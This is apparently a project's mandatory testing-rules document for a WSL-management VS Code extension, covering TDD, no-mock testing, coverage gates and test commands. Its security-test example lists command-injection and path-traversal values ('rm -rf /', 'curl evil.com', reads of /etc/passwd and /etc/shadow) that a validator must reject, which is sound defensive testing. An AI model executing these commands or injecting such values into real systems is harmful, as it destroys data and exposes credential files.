# ⚠️ TESTING-RULES.md - Mandatory Testing Rules

**THESE RULES ARE NON-NEGOTIABLE. ALL CODE MUST COMPLY.**

## 🛑 CRITICAL UPDATE: Three-Level Real Testing Architecture

### Rule #0: NO MOCKS - Real Testing Only
**ALL TESTS MUST USE REAL IMPLEMENTATIONS**
```typescript
// ❌ FORBIDDEN: Mocking
jest.mock('./wslManager');
vi.mock('vscode');
const mockExec = jest.fn();

// ✅ REQUIRED: Real Testing
import { execSync } from 'child_process';
const output = execSync('wsl.exe --list', { encoding: 'utf16le' });
```

### Rule #1: Test First, Always
**NO PRODUCTION CODE WITHOUT A FAILING TEST FIRST**
```typescript
// ❌ WRONG: Writing code first
function cloneDistribution(source, target) {
    // Implementation
}

// ✅ RIGHT: Writing test first (with REAL testing)
it('should clone distribution', async () => {
    const result = await cloneDistribution('Ubuntu', 'MyProject');
    // Verify with actual WSL command
    const distros = execSync('wsl.exe --list --quiet');
    expect(distros).toContain('MyProject');
});
// THEN implement to make test pass
```

### Rule #2: Three-Level Testing Required
**Every feature MUST have tests at appropriate levels:**
- **Level 1 (Unit)**: Real system calls, 2-5 seconds
- **Level 2 (API)**: Real VS Code APIs, 20-30 seconds
- **Level 3 (E2E)**: Real UI interaction, 1-2 minutes

### Rule #3: Coverage Gates Are Mandatory
**Code will be REJECTED if coverage drops below thresholds:**
- Global: 80% minimum
- Critical Path: 100% required
- Security Code: 100% required
- New Code: 90% minimum
- **Coverage must be from REAL tests, not mocks**

### Rule #4: All Tests Must Pass Locally AND in CI
**Tests must pass in WSL, with Xvfb, and on Windows**

## 📋 Pre-Commit Checklist

Before EVERY commit, you MUST:

- [ ] Run `npm run test:unit` - Level 1 tests must pass (5 seconds)
- [ ] Run `npm run test:integration` - Level 2 tests must pass (30 seconds)
- [ ] Run `npm run test:coverage` - Coverage must meet thresholds
- [ ] Run `npm run lint` - No linting errors
- [ ] Run `npm run compile` - TypeScript must compile
- [ ] Verify NO MOCKS in new tests
- [ ] Update feature coverage with test levels
- [ ] Add REAL tests for ANY new code

## 🔴 Critical Path Features - 100% Coverage Required

These features MUST have complete test coverage:

1. **Extension Activation** (`src/extension.ts`)
   - Test file: `test/unit/extension.test.ts`
   - Coverage: Must be 100%

2. **Distribution Management** (`src/wslManager.ts`)
   - Test file: `test/unit/wslManager.test.ts`
   - Coverage: Must be 100%

3. **Input Sanitization** (`src/utils/inputValidator.ts`)
   - Test file: `test/unit/inputValidator.test.ts`
   - Coverage: Must be 100%

4. **Security Validation** (`src/security/securityValidator.ts`)
   - Test file: `test/security/securityValidator.test.ts`
   - Coverage: Must be 100%

5. **Error Handling** (`src/errors/errorHandler.ts`)
   - Test file: `test/unit/errorHandler.test.ts`
   - Coverage: Must be 100%

## 🚫 Forbidden Practices

### NEVER Do These:

1. **Skip Tests**
   ```typescript
   // ❌ FORBIDDEN
   it.skip('should validate input', () => {
   ```

2. **Disable Tests**
   ```typescript
   // ❌ FORBIDDEN
   xit('should handle errors', () => {
   ```

3. **Comment Out Tests**
   ```typescript
   // ❌ FORBIDDEN
   // it('should work', () => {
   ```

4. **Ignore Failing Tests**
   ```typescript
   // ❌ FORBIDDEN
   try {
       runTest();
   } catch {
       // Ignore and continue
   }
   ```

5. **Merge with Failing Tests**
   ```bash
   # ❌ FORBIDDEN
   git merge feature-branch # With failing tests
   ```

## ✅ Required Test Patterns

### Every Test Must Follow AAA Pattern

```typescript
it('should [clear description of expected behavior]', () => {
    // Arrange - Set up test conditions
    const input = 'test-data';
    const expected = 'expected-result';

    // Act - Execute the function
    const result = functionUnderTest(input);

    // Assert - Verify the outcome
    expect(result).toBe(expected);
});
```

### Security Tests Are Mandatory

For ANY function that accepts user input:

```typescript
describe('Security', () => {
    const maliciousInputs = [
        'test; rm -rf /',
        'test && curl evil.com',
        '../../../etc/passwd',
        'test`whoami`',
        'test$(cat /etc/shadow)'
    ];

    maliciousInputs.forEach(input => {
        it(`should reject malicious input: ${input}`, () => {
            expect(() => functionUnderTest(input)).toThrow();
        });
    });
});
```

## 📊 Coverage Enforcement

### Automatic Coverage Checks

```json
// jest.config.js - These thresholds are ENFORCED
{
    "coverageThreshold": {
        "global": {
            "branches": 80,
            "functions": 80,
            "lines": 80,
            "statements": 80
        },
        "./src/security/**": {
            "branches": 100,
            "functions": 100,
            "lines": 100,
            "statements": 100
        }
    }
}
```

### Coverage Reports Required for PRs

Every PR must include:
1. Coverage report screenshot
2. Proof that coverage didn't decrease
3. 100% coverage for new code

## 🔄 TDD Workflow - Mandatory Process

### Step 1: Write Test First
```bash
# Create test file BEFORE implementation
touch test/unit/newFeature.test.ts
```

### Step 2: Run Test (Must Fail)
```bash
npm test newFeature.test.ts
# ❌ Test should fail - feature doesn't exist yet
```

### Step 3: Write Minimal Code
```typescript
// Only write enough to make test pass
export function newFeature() {
    return 'minimal implementation';
}
```

### Step 4: Run Test (Must Pass)
```bash
npm test newFeature.test.ts
# ✅ Test should pass now
```

### Step 5: Refactor (Tests Still Pass)
```bash
# Improve code while tests ensure nothing breaks
npm test newFeature.test.ts
# ✅ Tests still pass after refactoring
```

## 🚨 Test Failure Protocol

When tests fail:

1. **STOP all other work**
2. **FIX the failing test immediately**
3. **DO NOT:**
   - Skip the test
   - Disable the test
   - Modify test to pass incorrectly
   - Continue with other features

## 📈 Performance Requirements

Tests must meet these performance targets:

| Test Type | Maximum Time | Action if Exceeded |
|-----------|--------------|-------------------|
| Unit Test | 200ms | Optimize or split test |
| Integration Test | 5s | Review test design |
| E2E Test | 30s | Consider parallelization |
| Full Suite | 10min | Mandatory optimization |

## 🔍 Code Review Checklist

Reviewers MUST verify:

- [ ] Tests written before code
- [ ] All tests pass locally
- [ ] Coverage meets thresholds
- [ ] No skipped/disabled tests
- [ ] Security tests for user input
- [ ] AAA pattern followed
- [ ] Descriptive test names
- [ ] Edge cases covered

## 🎯 Feature Coverage Tracking

### Before Starting Any Feature:

1. Check feature coverage document
2. Update status to "In Progress"
3. Write ALL tests for the feature
4. Implement until tests pass
5. Update coverage metrics
6. Mark feature as "Complete"

### Coverage Update Template:

```markdown
| Feature | Before | After | Delta | Status |
|---------|--------|-------|-------|--------|
| WSL-001 | 0% | 95% | +95% | ✅ Complete |
```

## ⚡ Quick Test Commands

```bash
# THREE-LEVEL TESTING
npm run test:unit           # Level 1: Unit tests (5 seconds)
npm run test:integration    # Level 2: API tests (30 seconds)
npm run test:e2e           # Level 3: UI tests (2 minutes)
npm run test:all           # All three levels sequentially

# BEFORE EVERY COMMIT
npm run test:unit          # Minimum requirement
npm run test:coverage      # Check coverage (real tests only)
npm run test:security      # Security validation

# DURING DEVELOPMENT
npm run test:unit:watch    # TDD mode for Level 1
npm run test:debug         # Debug with logs
npm run test:real-output   # Test actual outputs

# BEFORE PR
npm run test:comprehensive # Full real test validation
npm run test:ci           # Exact CI environment test
```

## 🔒 Security Testing Requirements

### Every External Input Must Be Tested

```typescript
// For EVERY function that accepts external input
describe('Input Validation', () => {
    it('should reject null input', () => {
        expect(() => func(null)).toThrow();
    });

    it('should reject undefined input', () => {
        expect(() => func(undefined)).toThrow();
    });

    it('should reject empty string', () => {
        expect(() => func('')).toThrow();
    });

    it('should reject special characters', () => {
        expect(() => func('!@#$%^&*()')).toThrow();
    });
});
```

## 📝 Test Documentation Requirements

Every test file must include:

```typescript
/**
 * Test Suite: [Component Name]
 * Feature: [Feature ID from coverage doc]
 * Priority: [CRITICAL|HIGH|MEDIUM|LOW]
 * Coverage Target: [percentage]
 * 
 * Description: What this test suite validates
 * 
 * Critical Test Cases:
 * - [List key scenarios tested]
 */
```

## ❌ Consequences of Non-Compliance

Violations of these rules will result in:

1. **PR Rejection** - No merge until fixed
2. **CI Build Failure** - Automatic blocking
3. **Code Revert** - If merged accidentally
4. **Review Required** - Additional scrutiny

## 🏆 Quality Goals

We maintain these standards because:

- **User Trust:** Our users depend on this working correctly
- **Security:** One vulnerability affects everyone
- **Reliability:** 99.9% uptime requires 100% confidence
- **Maintainability:** Tests are documentation
- **Team Velocity:** Good tests = faster development

## 📞 Escalation

If you cannot meet these requirements:

1. **Document the blocker**
2. **Propose alternative approach**
3. **Get approval from QA Manager**
4. **Update this document if rules change**

---

**Remember:** These rules exist to ensure quality. Every test you write protects our users.

**Last Updated:** September 2024
**Enforced By:** Marcus Johnson, QA Manager
**Automation:** GitHub Actions, Pre-commit Hooks, Jest Coverage Gates